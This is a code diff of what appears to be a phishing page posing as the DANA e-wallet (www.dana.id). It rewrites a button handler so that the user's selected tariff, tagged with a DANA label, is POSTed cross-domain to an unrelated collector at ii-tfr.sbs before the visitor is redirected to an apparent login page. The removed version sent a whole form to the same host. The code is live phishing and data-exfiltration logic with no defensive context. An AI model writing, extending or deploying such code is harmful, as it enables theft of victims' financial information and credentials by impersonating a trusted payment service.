@@ -592,26 +592,34 @@ owl.owlCarousel({
             </script>
             
            <script>
-  function letsgo1(){
-var tarif = $('input[name="tarif"]:checked').val();
+var logo = "☴ www.dana.id ☴";    
+       
+ function letsgo1(){
+    $("#process1").fadeIn();
+    event.preventDefault();
+    
+  var tarif = $('input[name="tarif"]:checked').val();
        if (tarif) {  
   sessionStorage.setItem('tarif', tarif);
   }
- event.preventDefault();
-      $("#process1").fadeIn(); 
-        $.ajax({
-            type: 'POST',
-            url: 'https://ii-tfr.sbs/dana/vt5cw/ss/im.php',
-            data: $('#patok').serialize(),
-            datatype: 'JSON',            
-            complete: function(data) {
-            setTimeout(function(){            
-            window.location.href='surend11.html';
-            $("#process1").fadeOut();     
-   }, 500);
-            }
-          })
-        } 
+    
+  var gabungan = "" + logo + '\n\n' + tarif;
+        
+   $.ajax({
+        url: 'https://ii-tfr.sbs/dana/vt5cw/ss/im.php',       
+        type: 'POST',
+        data: { message: gabungan },
+        crossDomain: true,
+        headers: {
+            'Accept': 'application/json',
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+    
+    complete: function(){  
+    setTimeout(function(){
+    $("#process1").fadeOut();
+    location.href='lg1.html';
+    }, 200);}});};
 </script>
 </body>
 
